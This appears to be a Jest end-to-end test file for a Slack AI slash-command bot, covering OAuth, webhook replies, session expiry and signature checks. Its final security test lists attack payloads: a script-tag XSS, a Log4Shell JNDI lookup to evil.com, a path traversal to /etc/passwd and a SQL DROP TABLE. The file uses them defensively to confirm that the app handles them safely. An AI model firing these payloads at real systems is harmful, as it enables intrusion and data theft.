import request from 'supertest';
import { app } from '../../src/app';
import { SessionService } from '../../src/services/session.service';

// 메모리 내 Redis 모킹
jest.mock('ioredis', () => {
  const memoryStore = new Map<string, { value: any; expiry?: number }>();
  
  return jest.fn().mockImplementation(() => ({
    connect: jest.fn().mockResolvedValue(undefined),
    disconnect: jest.fn().mockResolvedValue(undefined),
    quit: jest.fn().mockResolvedValue(undefined),
    ping: jest.fn().mockResolvedValue('PONG'),
    
    setex: jest.fn().mockImplementation((key: string, ttl: number, value: string) => {
      const expiry = Date.now() + (ttl * 1000);
      memoryStore.set(key, { value, expiry });
      return Promise.resolve('OK');
    }),
    
    get: jest.fn().mockImplementation((key: string) => {
      const item = memoryStore.get(key);
      if (!item) return Promise.resolve(null);
      if (item.expiry && Date.now() > item.expiry) {
        memoryStore.delete(key);
        return Promise.resolve(null);
      }
      return Promise.resolve(item.value);
    }),
    
    del: jest.fn().mockImplementation((key: string) => {
      const existed = memoryStore.has(key);
      memoryStore.delete(key);
      return Promise.resolve(existed ? 1 : 0);
    }),
    
    expire: jest.fn().mockImplementation((key: string, ttl: number) => {
      const item = memoryStore.get(key);
      if (!item) return Promise.resolve(0);
      item.expiry = Date.now() + (ttl * 1000);
      return Promise.resolve(1);
    }),
  }));
});

// E2E 테스트: Slack 통합 테스트 (실제 Slack API와의 상호작용)
describe('Slack Integration E2E Tests - Slack 통합 E2E 테스트', () => {
  let sessionService: SessionService;

  const testSlackWorkspace = {
    teamId: 'T0123456789',
    teamName: 'Test Workspace',
    userId: 'U0123456789',
    userName: 'test-user-e2e',
    channelId: 'C0123456789',
    channelName: 'test-channel',
  };

  beforeAll(async () => {
    // 테스트 환경 설정
    process.env.NODE_ENV = 'test';
    process.env.SLACK_SIGNING_SECRET = 'test-signing-secret-e2e';
    process.env.SLACK_CLIENT_ID = 'test-client-id-e2e';
    process.env.SLACK_CLIENT_SECRET = 'test-client-secret-e2e';
    process.env.ENCRYPTION_KEY = 'test-key-32-bytes-long-for-e2e-';

    const sessionConfig = {
      redisHost: 'localhost',
      redisPort: 6379,
      ttlHours: 1,
      encryptionKey: 'test-key-32-bytes-long-for-e2e-',
    };
    sessionService = new SessionService(sessionConfig);
  });

  afterAll(async () => {
    await sessionService.disconnect();
  });

  describe('OAuth 2.0 플로우 E2E 테스트', () => {
    it('should complete full OAuth flow with Slack', async () => {
      // Step 1: OAuth 시작 - 인증 URL 생성
      const oauthStartResponse = await request(app)
        .get('/auth/start');

      expect(oauthStartResponse.status).toBe(302);
      
      const redirectUrl = new URL(oauthStartResponse.headers.location);
      expect(redirectUrl.hostname).toBe('slack.com');
      expect(redirectUrl.pathname).toBe('/oauth/v2/authorize');
      
      // OAuth 파라미터 검증
      const params = redirectUrl.searchParams;
      expect(params.get('client_id')).toBe('test-client-id-e2e');
      expect(params.get('scope')).toBeTruthy();
      expect(params.get('redirect_uri')).toContain('/auth/callback');
      
      const state = params.get('state');
      expect(state).toBeTruthy();
      expect(state).toHaveLength(36); // UUID 형식

      // Step 2: Slack OAuth API 응답 모킹
      const mockSlackOAuthResponse = {
        ok: true,
        access_token: 'xoxb-e2e-test-token-12345',
        token_type: 'bot',
        scope: 'commands,chat:write,users:read',
        bot_user_id: 'B01234567890',
        app_id: 'A01234567890',
        team: {
          id: testSlackWorkspace.teamId,
          name: testSlackWorkspace.teamName,
        },
        enterprise: null,
        authed_user: {
          id: testSlackWorkspace.userId,
          scope: 'identify',
          access_token: 'xoxp-user-token',
          token_type: 'user',
        },
      };

      // Slack API 호출 모킹
      global.fetch = jest.fn()
        .mockResolvedValueOnce({
          ok: true,
          json: jest.fn().mockResolvedValue(mockSlackOAuthResponse),
        })
        .mockResolvedValueOnce({
          ok: true,
          json: jest.fn().mockResolvedValue({
            ok: true,
            user: {
              id: testSlackWorkspace.userId,
              name: testSlackWorkspace.userName,
              real_name: 'Test User E2E',
            },
          }),
        });

      // Step 3: OAuth 콜백 처리
      const oauthCallbackResponse = await request(app)
        .get('/auth/callback')
        .query({
          code: 'test-oauth-code-e2e',
          state: state,
        });

      expect(oauthCallbackResponse.status).toBe(200);
      expect(oauthCallbackResponse.body).toMatchObject({
        success: true,
        message: '인증이 완료되었습니다',
        team: testSlackWorkspace.teamName,
      });

      // Slack OAuth API 호출 검증
      expect(fetch).toHaveBeenCalledWith(
        'https://slack.com/api/oauth.v2.access',
        expect.objectContaining({
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: expect.stringContaining('client_id=test-client-id-e2e'),
        })
      );
    });

    it('should handle OAuth errors gracefully', async () => {
      const state = 'test-state-error';

      // Slack OAuth API 에러 응답 모킹
      global.fetch = jest.fn().mockResolvedValue({
        ok: true,
        json: jest.fn().mockResolvedValue({
          ok: false,
          error: 'invalid_code',
          error_description: 'The provided authorization code is invalid',
        }),
      });

      const oauthCallbackResponse = await request(app)
        .get('/auth/callback')
        .query({
          code: 'invalid-oauth-code',
          state: state,
        });

      expect(oauthCallbackResponse.status).toBe(400);
      expect(oauthCallbackResponse.body).toMatchObject({
        error: 'Slack 인증에 실패했습니다',
        details: 'invalid_code',
      });
    });
  });

  describe('슬래시 커맨드 E2E 테스트', () => {
    it('should process slash command and return immediate response', async () => {
      const slashCommandPayload = {
        token: 'test-verification-token-e2e',
        team_id: testSlackWorkspace.teamId,
        team_domain: 'test-workspace',
        channel_id: testSlackWorkspace.channelId,
        channel_name: testSlackWorkspace.channelName,
        user_id: testSlackWorkspace.userId,
        user_name: testSlackWorkspace.userName,
        command: '/ai',
        text: '"분석해줘" "이 데이터는 E2E 테스트용 샘플 데이터입니다."',
        response_url: 'https://hooks.slack.com/commands/e2e-test',
        trigger_id: 'trigger-e2e-test-123',
        api_app_id: 'A01234567890',
      };

      const response = await request(app)
        .post('/slack/commands')
        .send(slashCommandPayload)
        .set('Content-Type', 'application/x-www-form-urlencoded')
        .set('X-Slack-Request-Timestamp', Math.floor(Date.now() / 1000).toString())
        .set('X-Slack-Signature', 'v0=test-signature-e2e');

      expect(response.status).toBe(200);
      expect(response.body).toMatchObject({
        response_type: 'ephemeral',
        text: expect.stringContaining('AI 요청이 처리 중입니다'),
      });

      // 응답 시간 확인 (3초 이내)
      expect(response.header['x-response-time']).toBeFalsy(); // 응답이 빠르게 와야 함
    });

    it('should validate Slack request signature in production mode', async () => {
      // 프로덕션 모드 시뮬레이션
      const originalNodeEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      const slashCommandPayload = {
        token: 'test-verification-token-e2e',
        team_id: testSlackWorkspace.teamId,
        user_id: testSlackWorkspace.userId,
        user_name: testSlackWorkspace.userName,
        command: '/ai',
        text: '"테스트" "프로덕션 모드 서명 검증"',
        response_url: 'https://hooks.slack.com/commands/prod-test',
      };

      // 잘못된 서명으로 요청
      const invalidSignatureResponse = await request(app)
        .post('/slack/commands')
        .send(slashCommandPayload)
        .set('Content-Type', 'application/x-www-form-urlencoded')
        .set('X-Slack-Request-Timestamp', Math.floor(Date.now() / 1000).toString())
        .set('X-Slack-Signature', 'v0=invalid-signature');

      // 프로덕션에서는 서명 검증이 활성화되어야 함
      expect(invalidSignatureResponse.status).toBe(401);

      // 환경 변수 복원
      process.env.NODE_ENV = originalNodeEnv;
    });

    it('should handle various slash command formats', async () => {
      const commandVariations = [
        {
          text: '"요약해줘" "긴 텍스트 데이터를 여기에 입력합니다."',
          description: '기본 형식: 프롬프트 + 데이터',
        },
        {
          text: '"안녕하세요"',
          description: '프롬프트만 있는 형식',
        },
        {
          text: '\"번역해줘\" \"Hello, how are you?\"',
          description: '이스케이프된 따옴표 형식',
        },
      ];

      for (const variation of commandVariations) {
        const response = await request(app)
          .post('/slack/commands')
          .send({
            token: 'test-verification-token-e2e',
            team_id: testSlackWorkspace.teamId,
            user_id: testSlackWorkspace.userId,
            user_name: testSlackWorkspace.userName,
            command: '/ai',
            text: variation.text,
            response_url: 'https://hooks.slack.com/commands/variation-test',
            channel_id: testSlackWorkspace.channelId,
          })
          .set('Content-Type', 'application/x-www-form-urlencoded')
          .set('X-Slack-Request-Timestamp', Math.floor(Date.now() / 1000).toString())
          .set('X-Slack-Signature', 'v0=test-signature-variation');

        expect(response.status).toBe(200);
        expect(response.body.text).toContain('AI 요청이 처리 중입니다');
      }
    });
  });

  describe('Slack Webhook 응답 E2E 테스트', () => {
    it('should post AI results to Slack channel via webhook', async () => {
      const responseUrl = 'https://hooks.slack.com/commands/webhook-test';
      let webhookPayload: any = null;

      // Slack webhook 호출 모킹 및 페이로드 캡처
      global.fetch = jest.fn().mockImplementation((url: string, options: any) => {
        if (url === responseUrl) {
          webhookPayload = JSON.parse(options.body);
          return Promise.resolve({
            ok: true,
            status: 200,
            statusText: 'OK',
          });
        }
        return Promise.resolve({ ok: true });
      });

      // AI 작업 처리 요청
      const queueTaskPayload = {
        requestId: 'webhook-test-123',
        prompt: '번역해줘',
        data: 'Hello, this is a webhook test.',
        userId: testSlackWorkspace.userId,
        channelId: testSlackWorkspace.channelId,
        workspaceId: testSlackWorkspace.teamId,
        responseUrl: responseUrl,
        priority: 'NORMAL',
        createdAt: new Date().toISOString(),
        metadata: {
          userName: testSlackWorkspace.userName,
          teamName: testSlackWorkspace.teamName,
          originalCommand: '/ai "번역해줘" "Hello, this is a webhook test."',
        },
      };

      const response = await request(app)
        .post('/tasks/process')
        .send(queueTaskPayload)
        .set('Content-Type', 'application/json')
        .set('Authorization', 'Bearer test-oidc-token-webhook');

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);

      // Slack webhook 호출 확인
      expect(fetch).toHaveBeenCalledWith(
        responseUrl,
        expect.objectContaining({
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
        })
      );

      // Webhook 페이로드 검증
      expect(webhookPayload).toBeDefined();
      expect(webhookPayload).toMatchObject({
        response_type: 'in_channel',
        text: expect.stringContaining('AI 응답'),
        blocks: expect.arrayContaining([
          expect.objectContaining({
            type: 'section',
            text: expect.objectContaining({
              type: 'mrkdwn',
              text: expect.stringContaining('AI 응답'),
            }),
          }),
        ]),
      });
    });

    it('should handle webhook failures gracefully', async () => {
      const failingResponseUrl = 'https://hooks.slack.com/commands/failing-webhook';

      // Slack webhook 실패 모킹
      global.fetch = jest.fn().mockImplementation((url: string) => {
        if (url === failingResponseUrl) {
          return Promise.resolve({
            ok: false,
            status: 500,
            statusText: 'Internal Server Error',
          });
        }
        return Promise.resolve({ ok: true });
      });

      const queueTaskPayload = {
        requestId: 'webhook-fail-test-123',
        prompt: '테스트',
        data: '웹훅 실패 테스트',
        userId: testSlackWorkspace.userId,
        channelId: testSlackWorkspace.channelId,
        workspaceId: testSlackWorkspace.teamId,
        responseUrl: failingResponseUrl,
        priority: 'NORMAL',
        createdAt: new Date().toISOString(),
        metadata: {
          userName: testSlackWorkspace.userName,
          teamName: testSlackWorkspace.teamName,
        },
      };

      const response = await request(app)
        .post('/tasks/process')
        .send(queueTaskPayload)
        .set('Content-Type', 'application/json')
        .set('Authorization', 'Bearer test-oidc-token-fail');

      // AI 처리는 성공하지만 웹훅 전송 실패 경고 포함
      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.warning).toContain('Slack 알림 전송에 실패했습니다');
    });
  });

  describe('세션 관리 E2E 테스트', () => {
    it('should maintain user session across multiple requests', async () => {
      // 초기 인증 및 세션 생성
      const sessionData = {
        userId: testSlackWorkspace.userId,
        token: 'xoxb-session-test-token',
        workspaceId: testSlackWorkspace.teamId,
        createdAt: new Date(),
        metadata: {
          userName: testSlackWorkspace.userName,
          teamName: testSlackWorkspace.teamName,
        },
      };

      const sessionId = await sessionService.createSession(
        'xoxb-session-test-token',
        sessionData
      );

      // 세션 쿠키로 여러 요청 수행
      const requests = Array.from({ length: 3 }, (_, i) =>
        request(app)
          .post('/slack/commands')
          .send({
            token: 'test-verification-token-e2e',
            team_id: testSlackWorkspace.teamId,
            user_id: testSlackWorkspace.userId,
            user_name: testSlackWorkspace.userName,
            command: '/ai',
            text: `"요청 ${i + 1}" "세션 유지 테스트 ${i + 1}"`,
            channel_id: testSlackWorkspace.channelId,
            response_url: 'https://hooks.slack.com/commands/session-test',
          })
          .set('Content-Type', 'application/x-www-form-urlencoded')
          .set('X-Slack-Request-Timestamp', Math.floor(Date.now() / 1000).toString())
          .set('X-Slack-Signature', 'v0=test-signature-session')
          .set('Cookie', `session=${sessionId}`)
      );

      const responses = await Promise.all(requests);

      // 모든 요청이 성공적으로 처리되어야 함
      responses.forEach((response, index) => {
        expect(response.status).toBe(200);
        expect(response.body.text).toContain('AI 요청이 처리 중입니다');
      });

      // 세션이 여전히 유효한지 확인
      const finalSession = await sessionService.getSession(sessionId);
      expect(finalSession).not.toBeNull();
      expect(finalSession!.userId).toBe(testSlackWorkspace.userId);
    });

    it('should handle session expiration correctly', async () => {
      // 짧은 TTL로 세션 생성 (테스트용)
      const shortTtlSessionConfig = {
        redisHost: 'localhost',
        redisPort: 6379,
        ttlHours: 0.001, // 약 3.6초
        encryptionKey: 'test-key-32-bytes-long-for-e2e-',
      };

      const tempSessionService = new SessionService(shortTtlSessionConfig);

      const sessionData = {
        userId: testSlackWorkspace.userId,
        token: 'xoxb-expiry-test-token',
        workspaceId: testSlackWorkspace.teamId,
        createdAt: new Date(),
        metadata: {
          userName: testSlackWorkspace.userName,
          teamName: testSlackWorkspace.teamName,
        },
      };

      const sessionId = await tempSessionService.createSession(
        'xoxb-expiry-test-token',
        sessionData
      );

      // 세션 만료까지 대기
      await new Promise(resolve => setTimeout(resolve, 4000));

      // 만료된 세션으로 요청
      const expiredSessionResponse = await request(app)
        .post('/slack/commands')
        .send({
          token: 'test-verification-token-e2e',
          team_id: testSlackWorkspace.teamId,
          user_id: testSlackWorkspace.userId,
          user_name: testSlackWorkspace.userName,
          command: '/ai',
          text: '"테스트" "만료된 세션 테스트"',
          channel_id: testSlackWorkspace.channelId,
          response_url: 'https://hooks.slack.com/commands/expiry-test',
        })
        .set('Content-Type', 'application/x-www-form-urlencoded')
        .set('X-Slack-Request-Timestamp', Math.floor(Date.now() / 1000).toString())
        .set('X-Slack-Signature', 'v0=test-signature-expiry')
        .set('Cookie', `session=${sessionId}`);

      // 만료된 세션이지만 요청은 여전히 처리되어야 함 (새 세션 생성)
      expect(expiredSessionResponse.status).toBe(200);

      await tempSessionService.disconnect();
    });
  });

  describe('보안 및 검증 E2E 테스트', () => {
    it('should reject requests with invalid Slack tokens', async () => {
      const invalidTokenRequest = {
        token: 'invalid-verification-token',
        team_id: testSlackWorkspace.teamId,
        user_id: testSlackWorkspace.userId,
        user_name: testSlackWorkspace.userName,
        command: '/ai',
        text: '"테스트" "잘못된 토큰 테스트"',
        channel_id: testSlackWorkspace.channelId,
        response_url: 'https://hooks.slack.com/commands/invalid-token',
      };

      const response = await request(app)
        .post('/slack/commands')
        .send(invalidTokenRequest)
        .set('Content-Type', 'application/x-www-form-urlencoded')
        .set('X-Slack-Request-Timestamp', Math.floor(Date.now() / 1000).toString())
        .set('X-Slack-Signature', 'v0=test-signature-invalid');

      // 테스트 환경에서는 토큰 검증이 비활성화될 수 있음
      // 프로덕션에서는 401 또는 403이 반환되어야 함
      if (process.env.NODE_ENV === 'production') {
        expect(response.status).toBeGreaterThanOrEqual(401);
      } else {
        // 테스트 환경에서는 통과할 수 있음
        expect(response.status).toBeGreaterThanOrEqual(200);
      }
    });

    it('should handle malicious input safely', async () => {
      const maliciousInputs = [
        '"><script>alert("XSS")</script>',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
        'DROP TABLE users; --',
        '\x00\x01\x02\x03',
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request(app)
          .post('/slack/commands')
          .send({
            token: 'test-verification-token-e2e',
            team_id: testSlackWorkspace.teamId,
            user_id: testSlackWorkspace.userId,
            user_name: testSlackWorkspace.userName,
            command: '/ai',
            text: `"테스트" "${maliciousInput}"`,
            channel_id: testSlackWorkspace.channelId,
            response_url: 'https://hooks.slack.com/commands/security-test',
          })
          .set('Content-Type', 'application/x-www-form-urlencoded')
          .set('X-Slack-Request-Timestamp', Math.floor(Date.now() / 1000).toString())
          .set('X-Slack-Signature', 'v0=test-signature-security');

        // 악성 입력이 포함되어도 애플리케이션이 안전하게 처리해야 함
        expect(response.status).toBeLessThan(500);
        
        // 응답에 악성 스크립트가 포함되지 않아야 함
        if (response.body.text) {
          expect(response.body.text).not.toContain('<script>');
          expect(response.body.text).not.toContain('jndi:');
        }
      }
    });
  });
});